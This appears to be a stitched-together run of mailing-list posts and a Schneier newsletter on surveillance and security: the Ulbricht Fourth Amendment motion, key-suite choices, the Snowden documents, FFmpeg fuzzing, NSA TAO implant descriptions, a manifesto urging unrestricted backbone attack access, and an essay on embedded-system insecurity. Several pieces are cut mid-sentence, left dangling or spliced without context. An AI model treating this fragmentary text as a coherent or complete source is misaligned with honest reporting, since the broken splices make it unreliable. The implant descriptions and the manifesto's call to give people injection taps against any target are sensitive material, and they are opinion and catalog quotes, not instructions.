convince a judge to sign off on a warrant; The warrantless
surveillances ops included asking Comcast for information related to
Ulbricht’s alleged IP address in San Francisco. And even in the cases
when investigators did get a warrant before performing their
searches—as in the case of a Samsung laptop believed to belong to
Ulbricht as well as his Gmail and Facebook accounts—Ulbricht’s defense
argues that those warrants were unconstitutional “general warrants”
that allowed a wholesale dump of his private data rather than allowing
the search for a specific piece of information.
“Many of the warrants…constitute the general warrants abhorred by the
Framers, and which led directly to the Fourth Amendment,” the memo
reads.  “The wholesale collection and study of Mr. Ulbricht’s entire
digital history without limitation – expressly sought in the warrants
and granted – represent the very type of indiscriminate rummaging that
caused the American colonists so much consternation.”
Ulbricht’s memo isn’t simply a demand to dismiss the charges against
him, which include conspiracy to traffic in narcotics, money
laundering, and a “kingpin” statute often used against mob bosses and
drug cartel leaders. It’s also a request for more information from
prosecutors. Despite the “discovery” process designed to give
defendants a chance to review the evidence against them, the memo says
that the government still hasn’t revealed to Ulbricht or the public
many aspects of the investigation. The most crucial of those
information gaps is just how the FBI located the Silk Road’s servers
despite the anonymity protections provided by cryptographic software
“All of the searches and seizures are predicated upon the government’s
infiltration of the alleged ‘Silk Road Servers,’” reads the memo.
“However, that event – location of the Silk Road Servers – is shrouded
in mystery, as the means and manner in which that discovery was
accomplished has not been disclosed.”
If that initial pinpointing and penetration of Ulbricht’s alleged
servers—whether by the FBI, the NSA, or investigators with the means
of defeating Tor’s privacy safeguards—is determined to be
unconstitutional, the defense argues it could contaminate virtually
all of the prosecution’s other evidence. It points to what it calls
the “fruit of a poisonous tree” doctrine, stating that an improper
search can invalidate all subsequent searches based on evidence found
in the initial step. And it notes that the requests to judges for
warrants in other steps of the feds’ investigation didn’t explain or
even mention that initial discovery of the Silk Road’s computers in
The memo backs up its argument by referring to several recent fourth
amendment decisions, most notably the case of Riley vs. California, in
which the Supreme Court ruled that a police can’t search a arrested
suspect’s phone without a warrant due to the massive amount of private
data that sort of digital device contains. It also points to another
case in which Microsoft was ordered to respond to a search warrant for
emails belonging to one of its users, even though the emails were
stored on a foreign server. Ulbricht’s defense points to that second
case as a demonstration that the government ought to seek a warrant
even when the information it’s seeking is stored abroad, as in the
case of the Silk Road’s Icelandic servers.
“The government has not provided any reason why it could not have
pursued, and why it was not obligated under its own theory of the
scope of [the law], to pursue the same avenue – a warrant – for
obtaining the [electronic stored information] on the Silk Road
Server,” the memo reads.
Aside from its Fourth Amendment arguments, the memo makes an unrelated
request: That the prosecution stop calling Ulbricht a murderer. In its
criminal complaint and pre-trial arguments, the prosecution has
referred repeatedly to Ulbricht’s alleged attempts to pay for the
murder of six people, including what the prosecutors describe as a
potential informant against him and a blackmailer. But despite the
fact that Ulbricht still faces a separate murder-for-hire case in
Maryland, he hasn’t been charged with any such killings in the current
Southern District of New York case. The defense argues that means the
prosecution’s murder references are “unduly prejudicial” and violate
Ulbricht’s right to a fair trial.
Those murder charges have weighed heavily on Ulbricht’s reputation,
draining support for a young defendant who might have otherwise been a
cause celebre for privacy and personal freedoms–after all, the Silk
Road’s creator who called himself the “Dread Pirate Roberts” preached
a libertarian philosophy of “victimless” crime and civil disobedience.
With his latest motion, that alleged “pirate” is taking another,
well-timed shot at elevating his case beyond one of a cybercriminal
drug kingpin–this time to a story of illegal government surveillance.

embedded systems have turned to GSM as a management channel, such as

all be susceptible to man-in-the-middle and rogue BTS attacks.
The current state of baseband security means that it is difficult to

@_subject: pie in sky suites - long lived public key pairs for persistent 
use case is long term (decade+) identity rather than privacy or
session authorization.
eternity key signs working keys tuned for speed with limited secret
life span (month+).  working keys are used for secret exchange and any
other temporal purpose.
you may use any algorithms desired; what do you pick?
Curve3617+NTRU eternity key
Curve25519 working keys
ChaCha20+Poly1305-AES for sym./mac
this assumes key agility by signing working keys with all eternity
keys, and promoting un-broken suites to working suites as needed.  you
cannot retro-actively add new suites to eternity keys; these must be
selected and generated extremely conservatively.
other questions:
- would you include another public key crypto system with the above?
(if so, why?)
- does GGH signature scheme avoid patent mine fields? (like NTRU patents)
- is it true that NSA does not use any public key scheme, nor AES, for
long term secrets?
- are you relieved NSA has only a modest effort aimed at keeping an
eye on quantum cryptanalysis efforts in academia and other nations?

---------- Forwarded message ----------
NSA's Kevin Igoe writes, on the semi-moderated cfrg at irtf.org list:
There are several interesting aspects to this patent FUD. Notice that
the FUD is being used to argue against switching to curves that improve
ECC security. Notice also the complete failure to specify any patent
numbers---so the FUD doesn't have any built-in expiration date, and
there's no easy way for the reader to investigate further.
 says that
Certicom "discovered and patented many fundamental innovations" and has
"more than 350 patents and patents pending worldwide". This sounds
impressive until you look at what the portfolio actually contains.
The reality is that Certicom has contributed essentially nothing to
state-of-the-art ECC. Its patent portfolio consists of a few fringe
ideas and a few obsolete ideas---nothing essential for mainstream ECC
usage. Nobody needs MQV, for example: traditional DH achieves the same
security goals in a much more straightforward way, and very few people
notice the marginal performance benefit provided by MQV.
The reason that Certicom has so many "patents and patents pending
worldwide", despite having contributed so few ideas, is that it keeps
splitting its patent applications. For example, the original MQV patent
filings in early 1995 ended up being split into an incredibly redundant
collection of US patents 5761305, 5889865, 5896455, 5933504, 6122736,
6487661, 7243232, 7334127, 7779259, 8090947, and 8209533, not to mention
the corresponding non-US patents CA2237688, DE69636815, EP0873617, etc.

@_subject: Omidyar influence in new Greenwald venture [was: SRF: cryptic] 
References: GG refutes this premise entirely, and with conviction:
(4) The claim that we are "holding back documents" for some nefarious
or self-interested purpose is and always has been false. I have
discussed many times before - most prominently here - why our
agreement with our source, along with related legal issues, prevents
any sort of mass release of documents, but I have been working
endlessly, as has Laura, to continue to publish stories all around the
world, including publishing many stories and documents after we formed
our new venture.
Not only have I published new documents in Norway, Sweden, France,
Spain, and Holland after we formed our new venture, but I also
published one of the most attention-generating stories yet in the
Huffington Post just five weeks ago. Similarly, Laura has published
numerous big articles and key NSA documents in both der Spiegel and
the NYT after we formed our new venture. We're doing the exact
opposite of this accusation: we're publishing documents and stories
aggressively all over the world with other media outlets until our
First Look site is ready.
We will continue to publish aggressively with other outlets until we
are up and running at First Look. In fact, I am working right now with
other news outlets, including in the U.S., on big stories. I'm not
"holding back" anything: of all the many entities with thousands of
Snowden documents, I have published more NSA documents, in more
nations around the world, than anyone. And there are many, many more
that will be published in the short-term.
But - and this is critical - in his Washington Post interview with
Snowden last month, Bart Gellman noted "Snowden’s insistence, to this
reporter and others, that he does not want the documents published in
bulk." From the start, Snowden indeed repeatedly insisted on that.
Anyone who demands that we "release all documents" - or even release
large numbers in bulk - is demanding that we violate our agreement
with our source, disregard the framework we created when he gave us
the documents, jeopardize his interests in multiple ways, and subject
him to far greater legal (and other) dangers. I find that demand to be
unconscionable, and we will never, ever violate our agreement with him
no matter how many people want us to.
That said, we have published an extraordinary number of top secret NSA
documents around the world in a short period of time. And our work is
very far from done: there are many, many more documents and stories
that we will publish.
Toward that end, we have very carefully increased the number of
journalists and experts who are working on these documents and who
have access to them. We are now working with more experts in
cryptography and hacking than ever. One of the most exciting things
about our new organization is that we now have the resources to
process and report these documents more quickly and efficiently than
ever before, consistent with ensuring that we don't make the kinds of
errors that would allow others to attack the reporting.
These documents are complex. Sometimes they take a good deal of
reporting to fill in some of the gaps. From the start, people have
been eager for us to make serious mistakes so they can exploit them to
discredit the reporting, and so we work very hard to make sure that
doesn't happen. That takes time. Convincing media institutions (and
their armies of risk-averse lawyers, editors and executives) to
publish documents, the aggressive way we think they need to be
published, also often takes a lot of time.
When we began our reporting in June by publishing a new story every
day, even our allies - people who work on these issues for a living -
complained that the releases were coming too fast to process,
understand, or keep up with, and argued that each story needs time to
be processed and to allow people to react.
In terms of effects, I think it's hard to argue with the strategy.
Even seven months later, the story continues to dominate headlines
around the world and to trigger what Chelsea Manning described in her
private chat as her goal when whistleblowing: "worldwide discussion,
debates, and reforms". That's why Edward Snowden made clear to Bart
Gellman that he "succeeded beyond plausible ambition."
For the same reason, I'm proud that we're trying to amplify the
lessons and maximize the impact of these disclosures even more through
things like books and films, which can reach and affect audiences that
political reporting by itself never can. I've been working for many
years warning of the dangers of state surveillance and the value of
internet freedom and privacy, and am thrilled to now be able to have
those messages heard much more loudly and clearly than ever before by
using all platforms to communicate them.
In sum, I know that we have been and continue to be extremely faithful
and loyal to the agreement we entered into with our source, and are
doing our journalism exactly as we assured him he would. As Snowden
himself has said, he thinks that, too. That continues to be a
critically important metric for me.

my comment was in reference to the prosecution of a guy for merely
calling himself a hacker, e.g.:
... accused of: threatening national security by open-sourcing a
network visualization and whitelisting tool....
... and ""hacker" admission on defendants website"
    the only reliable way to avoid retribution and arbitrary prosecution
seems to be: stay off the radar!
but this runs counter to the need, as you describe, for "brave

there are three tales to tell:

institutions lacking tact.  2003 Synopsis scanned and vulnerable,
Synopsis providing licensed IP to Intel, the Oregon behemoth, who then
combined a PR ruse[0] with InfraGard pull for a FBI fishing expedition
trying to catch dirt...
the second: monitoring from convenient location unexpectedly colocated
by covert crash pad for $TLA adventure leads to lessons on mutual
authentication assurances.
the third: a "research experiment" widely talked about yet so few know
about.  in 2007 a confluence of factors collided in the perfect storm:
a Tor privacy appliance actively thwarted by VMWare, a Tor summer of
code proposal rejected with prejudice, and a rash of mediocre Tor
vulnerability papers garnering press and pomp for posturing poseurs.
under this cloud of discontent we discovered and maximized a control
port vulnerability to demonstrate both the inherent strength of a
virtualized transparent proxy model, but also just how bad a truly a
truly bad vulnerability can be in practice. (dialed to 11, and
discovered the unbelievable without getting disappeared ;)

"Netstumbling is not against the law, says special agent Mary Kimura

close. "It's not illegal to scan for open networks," Kimura says, "but
once a theft of service, denial of service, or theft of information
occurs, then it becomes a federal violation." Kimura is the Infragard

FFmpeg and a thousand fixes
Friday, January 10, 2014 9:06 AM
Posted by Mateusz Jurczyk and Gynvael Coldwind, Information Security Engineers
At Google, security is a top priority - not only for our own products,
but across the entire Internet. That’s why members of the Google
Security Team and other Googlers frequently perform audits of software
and report the resulting findings to the respective vendors or
maintainers, as shown in the official “Vulnerabilities - Application
Security” list. We also try to employ the extensive computing power of
our data centers in order to solve some of the security challenges by
performing large-scale automated testing, commonly known as fuzzing.
One internal fuzzing effort we have been running continuously for the
past two years is the testing process of FFmpeg, a large
cross-platform solution to record, convert and stream audio and video
written in C. It is used in multiple applications and software
libraries such as Google Chrome, MPlayer, VLC or xine. We started
relatively small by making use of trivial mutation algorithms, some
500 cores and input media samples gathered from readily available
sources such as the samples.mplayerhq.hu sample base and FFmpeg FATE
regression testing suite. Later on, we grew to more complex and
effective mutation methods, 2000 cores and an input corpus supported
by sample files improving the overall code coverage.
Following more than two years of work, we are happy to announce that
the FFmpeg project has incorporated more than a thousand fixes to bugs
(including some security issues) that we have discovered in the
project so far:
$ git log | grep Jurczyk | grep -c Coldwind
... we have carried out several dozen fuzzing iterations (each
typically resulting in less crashes than the previous ones) over the
last two years, identifying bugs of a number of different classes:
NULL pointer dereferences,
Invalid pointer arithmetic leading to SIGSEGV due to unmapped memory access,
Out-of-bounds reads and writes to stack, heap and static-based arrays,
Invalid free() calls,
Double free() calls over the same pointer,
Division errors,
Assertion failures,
Use of uninitialized memory.
We have simultaneously worked with the developers of Libav, an
independent fork of FFmpeg, in order to have both projects represent
an equal, high level of robustness and security posture. Today, Libav
is at 413 fixes and the library is slowly but surely catching up with

these systems have been deployed domestically, albeit under the guise
of "valid foreign intelligence targets"... and those a suspiciously
close number of hops from same.
But the program, code-named Quantum, has also been successful in
inserting software into Russian military networks and systems used by
the Mexican police and drug cartels, trade institutions inside the
European Union, and sometime partners against terrorism like Saudi
Arabia, India and Pakistan, according to officials and an N.S.A. map
that indicates sites of what the agency calls “computer network
“What’s new here is the scale and the sophistication of the
intelligence agency’s ability to get into computers and networks to
which no one has ever had access before,” said James Andrew Lewis, the
cybersecurity expert at the Center for Strategic and International
Studies in Washington. “Some of these capabilities have been around
for a while, but the combination of learning how to penetrate systems
to insert software and learning how to do that using radio frequencies
has given the U.S. a window it’s never had before.”...
There is no evidence that the N.S.A. has implanted its software or
used its radio frequency technology inside the United States. While
refusing to comment on the scope of the Quantum program, the N.S.A.
said its actions were not comparable to China’s.

Over the past two months, parts of the program have been disclosed in
documents from the trove leaked by Edward J. Snowden, the former
N.S.A. contractor. A Dutch newspaper published the map of areas where
the United States has inserted spy software, sometimes in cooperation
with local authorities, often covertly. Der Spiegel, a German
newsmagazine, published the N.S.A.'s catalog of hardware products that
can secretly transmit and receive digital signals from computers, a
program called ANT. The New York Times withheld some of those details,
at the request of American intelligence officials, when it reported,
in the summer of 2012, on American cyberattacks on Iran.

0. "security by self evident existence"
Red-Team Networks Everywhere!!!
This effort attempts to remedy the pervasive and comprehensive
vulnerability of consumer, industry, and government hardware and
software systems.  In order to achieve best effective posture with
maximum haste apply four principles globally:
1) Blanket Legal Invulnerability
Remove all criminal and civil liability for "hacking", computer
trespass, and all related activities performed over data networks;
establish proactive "shield" legislation to protect and encourage
unrestricted security research of any subject on any network. extend
to international agreements for blanket protection in all
2) Educational Support Everywhere
Establish lock picking, computing, and hacking curriculum in pre
school through grade school with subsidized access to technical
resources including mobile, tablet, laptop test equipment, grid/cloud
computing on-demand, software defined radios with full
receive/transmit, and gigabit internet service or faster.
3) Collaborative Competitions
Organize a program of blue and red teaming challenges for educational
and public participation at the district, regional, and national level
cultivating expertise and rewarding it with hacking toys, access, and
4) Privileged Positioning
Direct and unrestricted backbone access to various individuals or
groups who demonstrate competence in either the educational or
competitive realms, in order for them to mount additional attack
strategies against any reach-able target. this access must consist of
both passive taps of backbone traffic as well as injection taps for
raw packet transmission at core rates. this should be available on the
Internet backbone at internet exchanges, private fiber through public
right of way, and core networks of operators of licensed wireless
end result / strong attractor:
Open software and hardware widely in use in
post-privacy-protection-purge future will invert power structure to
defender with near unassailable advantage in "cyber domain".  Any
attacker required to compete against the global, collaborative,
massive, iterative-crowd-hardened systems publicly in use.

it would be very interesting to combine the black budget disclosures
(as limited as they are) with the open data dumps for other
contracting, with the corporate financial reporting from the various
incorporated institutions implicated.  obviously privately held
interests will be harder to crack,...
this would provide a very interesting source of information for
further discovery along the timeline for which budget details are
given the RSA payout (as meager as it was, just for a little code
change ;) financial signals traced to these budgets could help
quantify the degree of complicity and duplicitous venality of various
technology vendors.  some affected are certainly more victims than

     How the NSA Threatens National Security
Secret NSA eavesdropping is still in the news. Details about once
secret programs continue to leak. The Director of National
Intelligence has recently declassified additional information, and the
President's Review Group has just released its report and
With all this going on, it's easy to become inured to the breadth and
depth of the NSA's activities. But through the disclosures, we've
learned an enormous amount about the agency's capabilities, how it is
failing to protect us, and what we need to do to regain security in
the Information Age.
First and foremost, the surveillance state is robust. It is robust
politically, legally, and technically. I can name three different NSA
programs to collect Gmail user data. These programs are based on three
different technical eavesdropping capabilities. They rely on three
different legal authorities. They involve collaborations with three
different companies. And this is just Gmail. The same is true for cell
phone call records, Internet chats, cell-phone location data.
Second, the NSA continues to lie about its capabilities. It hides
behind tortured interpretations of words like "collect,"
"incidentally," "target," and "directed." It cloaks programs in
multiple code names to obscure their full extent and capabilities.
Officials testify that a particular surveillance activity is not done
under one particular program or authority, conveniently omitting that
it is done under some other program or authority.
Third, US government surveillance is not just about the NSA. The
Snowden documents have given us extraordinary details about the NSA's
activities, but we now know that the CIA, NRO, FBI, DEA, and local
police all engage in ubiquitous surveillance using the same sorts of
eavesdropping tools, and that they regularly share information with
each other.
The NSA's collect-everything mentality is largely a hold-over from the
Cold War, when a voyeuristic interest in the Soviet Union was the
norm. Still, it is unclear how effective targeted surveillance against
"enemy" countries really is. Even when we learn actual secrets, as we
did regarding Syria's use of chemical weapons earlier this year, we
often can't do anything with the information.
Ubiquitous surveillance should have died with the fall of Communism,
but it got a new -- and even more dangerous -- life with the
intelligence community's post-9/11 "never again" terrorism mission.
This quixotic goal of preventing something from happening forces us to
try to know everything that does happen. This pushes the NSA to
eavesdrop on online gaming worlds and on every cell phone in the
world. But it's a fool's errand; there are simply too many ways to
We have no evidence that any of this surveillance makes us safer. NSA
Director General Keith Alexander responded to these stories in June by
claiming that he disrupted 54 terrorist plots. In October, he revised
that number downward to 13, and then to "one or two." At this point,
the only "plot" prevented was that of a San Diego man sending $8,500
to support a Somali militant group. We have been repeatedly told that
these surveillance programs would have been able to stop 9/11, yet the
NSA didn't detect the Boston bombings -- even though one of the two
terrorists was on the watch list and the other had a sloppy social
media trail. Bulk collection of data and metadata is an ineffective
counterterrorism tool.
Not only is ubiquitous surveillance ineffective, it is extraordinarily
costly. I don't mean just the budgets, which will continue to
skyrocket. Or the diplomatic costs, as country after country learns of
our surveillance programs against their citizens. I'm also talking
about the cost to our society. It breaks so much of what our society
has built. It breaks our political systems, as Congress is unable to
provide any meaningful oversight and citizens are kept in the dark
about what government does. It breaks our legal systems, as laws are
ignored or reinterpreted, and people are unable to challenge
government actions in court. It breaks our commercial systems, as US
computer products and services are no longer trusted worldwide. It
breaks our technical systems, as the very protocols of the Internet
become untrusted. And it breaks our social systems; the loss of
privacy, freedom, and liberty is much more damaging to our society
than the occasional act of random violence.
And finally, these systems are susceptible to abuse. This is not just
a hypothetical problem. Recent history illustrates many episodes where
this information was, or would have been, abused: Hoover and his FBI
spying, McCarthy, Martin Luther King Jr. and the civil rights
movement, anti-war Vietnam protesters, and -- more recently -- the
Occupy movement. Outside the US, there are even more extreme examples.
Building the surveillance state makes it too easy for people and
organizations to slip over the line into abuse.
It's not just domestic abuse we have to worry about; it's the rest of
the world, too. The more we choose to eavesdrop on the Internet and
other communications technologies, the less we are secure from
eavesdropping by others. Our choice isn't between a digital world
where the NSA can eavesdrop and one where the NSA is prevented from
eavesdropping; it's between a digital world that is vulnerable to all
attackers, and one that is secure for all users.
Fixing this problem is going to be hard. We are long past the point
where simple legal interventions can help. The bill in Congress to
limit NSA surveillance won't actually do much to limit NSA
surveillance. Maybe the NSA will figure out an interpretation of the
law that will allow it to do what it wants anyway. Maybe it'll do it
another way, using another justification. Maybe the FBI will do it and
give it a copy. And when asked, it'll lie about it.
NSA-level surveillance is like the Maginot Line was in the years
before World War II: ineffective and wasteful. We need to openly
disclose what surveillance we have been doing, and the known
insecurities that make it possible. We need to work toward security,
even if other countries like China continue to use the Internet as a
giant surveillance platform. We need to build a coalition of
free-world nations dedicated to a secure global Internet, and we need
to continually push back against bad actors -- both state and
non-state -- that work against that goal.
Securing the Internet requires both laws and technology. It requires
Internet technology that secures data wherever it is and however it
travels. It requires broad laws that put security ahead of both
domestic and international surveillance. It requires additional
technology to enforce those laws, and a worldwide enforcement regime
to deal with bad actors. It's not easy, and has all the problems that
other international issues have: nuclear, chemical, and biological
weapon non-proliferation; small arms trafficking; human trafficking;
money laundering; intellectual property. Global information security
and anti-surveillance needs to join those difficult global problems,
so we can start making progress.
The President's Review Group recommendations are largely positive, but
they don't go nearly far enough. We need to recognize that security is
more important than surveillance, and work towards that goal.

     NSA Exploit of the Day
One of the top secret NSA documents published by Der Spiegel is a
50-page catalog of "implants" from the NSA's Tailored Access Group.
Because the individual implants are so varied and we saw so many at
once, most of them were never discussed in the security community.
(Also, the pages were images, which makes them harder to index and
search.)  To rectify this, I am publishing an exploit a day on my
In the blog comments, feel free to discuss how the exploit works, how
we might detect it, how it has probably been improved since the
catalog entry in 2008, and so on.
"DEITYBOUNCE provides software application persistence on Dell
PowerEdge servers by exploiting the motherboard BIOS and utilizing
System Management Mode (SMM) to gain periodic execution while the
Operating System loads."
"IRONCHEF provides access persistence to target systems by exploiting
the motherboard BIOS and utilizing System  Management Mode (SMM) to
communicate with a hardware implany that provides two-way RF
communication."  It works on the HP Proliant 380DL G5 server.
"FEEDTROUGH is a persistence technique for two software implants,
DNT's BANANAGLEE and CES's ZESTYLEAK used against Juniper Netscreen
"GOURMETTROUGH is a user configurable implant for certain Juniper
firewalls. It persists DNT's BANANAGLEE implant across reboots and OS
upgrades. For some platforms, it supports a minimal implant with
beaconing for OS's unsupported by BANANAGLEE."
"The HALLUXWATER Persistence Back Door implant is installed on a
target Huawei Eudemon firewall as a boot ROM upgrade. When the target
reboots, the PBD installer software will find the needed patch points
and install the back door in the inbound packet processing routine."
"JETPLOW is a firmware persistence implant for Cisco PIX Series and
ASA (Adaptive Security Appliance) firewalls. It persists DNT's
BANANAGLEE software implant. JETPLOW also has a persistent back-door
"SOUFFLETROUGH is a BIOS persistence implant for Juniper SSG 500 and
SSG 300 firewalls. It persists DNT's BANANAGLEE software implant.
SOUFFLETROUGH also has an advanced persistent back-door capability."
"HEADWATER is a Persistent Backdoor (PDB) software implant for
selected Huawei routers. The implant will enable covert functions to
be remotely executed within the router via an Internet connection."
"SCHOOLMONTANA provides persistence for DNT implants. The DNT implant
will survive an upgrade or replacement of the operating system --
including physically replacing the router's compact flash card."
A U.S. government employee e-mailed me, asking me not to post these on
my blog.  The government has a weird policy that exposed secrets are
still secret, and government employees without clearances are
prohibited from reading the classified paragraphs.  I've heard this
before. Basically, before exposure only people with a TOP SECRET
clearance could read these paragraphs.  After exposure, only people
without any clearance at all can read these paragraphs.  No, it
doesn't make any sense.

     Tor User Identified by FBI
Eldo Kim sent an e-mail bomb threat to Harvard so he could skip a
final exam.  (It's just a coincidence that I was on the Harvard campus
that day.)  Even though he used an anonymous account and Tor, the FBI
identified him. Reading the criminal complaint, it seems that the FBI
got itself a list of Harvard users that accessed the Tor network, and
went through them one by one to find the one who sent the threat.
This is one of the problems of using a rare security tool.  The very
thing that gives you plausible deniability also makes you the most
likely suspect.  The FBI didn't have to break Tor; they just used
conventional police mechanisms to get Kim to confess.
Tor didn't break; Kim did.

     News
This story is about how at least two professional online poker players
had their hotel rooms broken into and their computers infected with
malware.  I agree with the conclusion: "So, what's the moral of the
story? If you have a laptop that is used to move large amounts of
money, take good care of it. Lock the keyboard when you step away. Put
it in a safe when you're not around it, and encrypt the disk to
prevent off-line access. Don't surf the web with it (use another
laptop/device for that, they're relatively cheap). This advice is true
whether you're a poker pro using a laptop for gaming or a business
controller in a large company using the computer for wiring a large
amount of funds."  Cheap laptops are very cheap, especially if you buy
old models off the remainder tables at big box stores.  There's no
reason not to have special purpose machines.
An interesting research paper documents a "honeymoon effect" when it
comes to software and vulnerabilities: attackers are more likely to
find vulnerabilities in older and more familiar code.  It's a few
years old, but I haven't seen it before now. The paper is by Sandy
Clark, Stefan Frei, Matt Blaze, and Jonathan Smith: "Familiarity

Two long blog posts on the NSA.  The first is about RSA entering into
a secret agreement with the NSA to make the backdoored DUAL_EC_PRNG
the default random number generator in their BSAFE toolkit.  The real
story here is how the NSA has corroded the trust on the Internet.
The second is about the NSA Tailored Access Operations (TAO) group and
their capabilities, based on new NSA top secret documents released by
Der Spiegel.  Jacob Appelbaum did a great job reporting on this stuff.
If you read nothing else from this issue of Crypto-Gram, read those two links.

Joseph Stiglitz has an excellent essay on the value of trust, and the
lack of it in today's society.
It has amazed me that the NSA doesn't seem to do any cost/benefit
analyses on any of its surveillance programs.  This seems particularly
important for bulk surveillance programs, as they have significant
costs aside from the obvious monetary costs.  In this paper, John
Mueller and Mark G. Stewart have done the analysis on one of these
programs.  Worth reading.
Matt Blaze on TAO's methods, pointing out that targeted surveillance
is better than bulk surveillance.
or This is important.  As scarily impressive as TAO's implant catalog is,
it's targeted.  We can argue about how it should be targeted -- who
counts as a "bad guy" and who doesn't -- but it's much better than the
NSA's collecting cell phone location data on everyone on the planet.
The more we can deny the NSA the ability to do broad wholesale
surveillance on everyone, and force them to do targeted surveillance
in individuals and organizations, the safer we all are.

     Security Risks of Embedded Systems
We're at a crisis point now with regard to the security of embedded
systems, where computing is embedded into the hardware itself -- as
with the Internet of Things. These embedded computers are riddled with
vulnerabilities, and there's no good way to patch them.
It's not unlike what happened in the mid-1990s, when the insecurity of
personal computers was reaching crisis levels. Software and operating
systems were riddled with security vulnerabilities, and there was no
good way to patch them. Companies were trying to keep vulnerabilities
secret, and not releasing security updates quickly. And when updates
were released, it was hard -- if not impossible -- to get users to
install them. This has changed over the past twenty years, due to a
combination of full disclosure -- publishing vulnerabilities to force
companies to issue patches quicker -- and automatic updates:
automating the process of installing updates on users' computers. The
results aren't perfect, but they're much better than ever before.
But this time the problem is much worse, because the world is
different: All of these devices are connected to the Internet. The
computers in our routers and modems are much more powerful than the
PCs of the mid-1990s, and the Internet of Things will put computers
into all sorts of consumer devices. The industries producing these
devices are even less capable of fixing the problem than the PC and
software industries were.
If we don't solve this soon, we're in for a security disaster as
hackers figure out that it's easier to hack routers than computers. At
a recent Def Con, a researcher looked at thirty home routers and broke
into half of them -- including some of the most popular and common
To understand the problem, you need to understand the embedded systems market.
Typically, these systems are powered by specialized computer chips
made by companies such as Broadcom, Qualcomm, and Marvell. These chips
are cheap, and the profit margins slim. Aside from price, the way the
manufacturers differentiate themselves from each other is by features
and bandwidth. They typically put a version of the Linux operating
system onto the chips, as well as a bunch of other open-source and
proprietary components and drivers. They do as little engineering as
possible before shipping, and there's little incentive to update their
"board support package" until absolutely necessary.
The system manufacturers -- usually original device manufacturers
(ODMs) who often don't get their brand name on the finished product --
choose a chip based on price and features, and then build a router,
server, or whatever. They don't do a lot of engineering, either. The
brand-name company on the box may add a user interface and maybe some
new features, make sure everything works, and they're done, too.
The problem with this process is that no one entity has any incentive,
expertise, or even ability to patch the software once it's shipped.
The chip manufacturer is busy shipping the next version of the chip,
and the ODM is busy upgrading its product to work with this next chip.
Maintaining the older chips and products just isn't a priority.
And the software is old, even when the device is new. For example, one
survey of common home routers found that the software components were
four to five years older than the device. The minimum age of the Linux
operating system was four years. The minimum age of the Samba file
system software: six years. They may have had all the security patches
applied, but most likely not. No one has that job. Some of the
components are so old that they're no longer being patched. This
patching is especially important because security vulnerabilities are
found "more easily" as systems age.
To make matters worse, it's often impossible to patch the software or
upgrade the components to the latest version. Often, the complete
source code isn't available. Yes, they'll have the source code to
Linux and any other open-source components. But many of the device
drivers and other components are just "binary blobs" -- no source code
at all. That's the most pernicious part of the problem: No one can
possibly patch code that's just binary.
Even when a patch is possible, it's rarely applied. Users usually have
to manually download and install relevant patches. But since users
never get alerted about security updates, and don't have the expertise
to manually administer these devices, it doesn't happen. Sometimes the
ISPs have the ability to remotely patch routers and modems, but this
is also rare.
The result is hundreds of millions of devices that have been sitting
on the Internet, unpatched and insecure, for the last five to ten
Hackers are starting to notice. Malware DNS Changer attacks home
routers as well as computers. In Brazil, 4.5 million DSL routers were
compromised for purposes of financial fraud. Last month, Symantec
reported on a Linux worm that targets routers, cameras, and other
embedded devices.
This is only the beginning. All it will take is some easy-to-use
hacker tools for the script kiddies to get into the game.
And the Internet of Things will only make this problem worse, as the
Internet -- as well as our homes and bodies -- becomes flooded with
new embedded devices that will be equally poorly maintained and
unpatchable. But routers and modems pose a particular problem, because
they're: (1) between users and the Internet, so turning them off is
increasingly not an option; (2) more powerful and more general in
function than other embedded devices; (3) the one 24/7 computing
device in the house, and are a natural place for lots of new features.
We were here before with personal computers, and we fixed the problem.
But disclosing vulnerabilities in an effort to force vendors to fix
the problem won't work the same way as with embedded systems. The last
time, the problem was computers, ones mostly not connected to the
Internet, and slow-spreading viruses. The scale is different today:
more devices, more vulnerability, viruses spreading faster on the
Internet, and less technical expertise on both the vendor and the user
sides. Plus vulnerabilities that are impossible to patch.
Combine full function with lack of updates, add in a pernicious market
dynamic that has inhibited updates and prevented anyone else from
updating, and we have an incipient disaster in front of us. It's just
a matter of when.
We simply have to fix this. We have to put pressure on embedded system
vendors to design their systems better. We need open-source driver
software -- no more binary blobs! -- so third-party vendors and ISPs
can provide security tools and software updates for as long as the
device is in use. We need automatic update mechanisms to ensure they
get installed.
The economic incentives point to large ISPs as the driver for change.
Whether they're to blame or not, the ISPs are the ones who get the
service calls for crashes. They often have to send users new hardware
because it's the only way to update a router or modem, and that can
easily cost a year's worth of profit from that customer. This problem
is only going to get worse, and more expensive. Paying the cost up
front for better embedded systems is much cheaper than paying the
costs of the resultant security disasters.

     Schneier News: I've Joined Co3 Systems
For decades, I've said that good security is a combination of
protection, detection, and response.  In 1999, when I formed
Counterpane Internet Security, I focused the company on what was then
the nascent area of detection.  Since then, there have been many
products and services that focus on detection, and it's a huge part of
the information security industry.  Now, it's time for response.
While there are many companies that offer services to aid in incident
response -- mitigation, forensics, recovery, compliance -- there are
no comprehensive products in this area.
Well, almost none.  Co3 Systems provides a coordination system for
incident response.  I think of it as a social networking site for
incident response, though the company doesn't use this term.  The idea
is that the system generates your incident response plan on
installation, and when something happens, automatically executes it.
It collects information about the incident, assigns and tracks tasks,
and logs everything you do.  It links you with information you might
need, companies you might want to talk to, and regulations you might
be required to comply with.  And it logs everything, so you can
demonstrate that you followed your response plan and thus the law --
or see how and where you fell short.
Years ago, attacks were both less frequent and less serious, and
compliance requirements were more modest. But today, companies get
breached all the time, and regulatory requirements are complicated --
and getting more so all the time.  Ad hoc incident response isn't
enough anymore.  There are lots of things you need to do when you're
attacked, both to secure your network from the attackers and to secure
your company from litigation.
The problem with any emergency response plan is that you only need it
in an emergency.  Emergencies are both complicated and stressful, and
it's easy for things to fall through the cracks.  It's critical to
have something -- a system, a checklist, even a person -- that tracks
everything and makes sure that everything that has to get done is.
Co3 Systems is great in an emergency, but of course you really want to
have installed and configured it *before* the emergency.
It will also serve you better if you use it regularly.  Co3 Systems is
designed to be valuable for all incident response, both the mundane
and the critical.  The system can record and assess everything that
appears abnormal.  The incident response plans it generates make it
easy, and the intelligence feeds make it useful.  If Co3 Systems is
already in place, when something turns out to be a real incident, it's
easy to escalate it to the next level, and you'll be using tools
you're already familiar with.
Co3 Systems works either from a private cloud or on your network.  I
think the cloud makes more sense; you don't want to coordinate
incident response from the network that is under attack.  And it's
constantly getting better as more partner companies integrate their
information feeds and best practices.  The company has launched some
of these partnerships already, and there are some major names soon to
be announced.
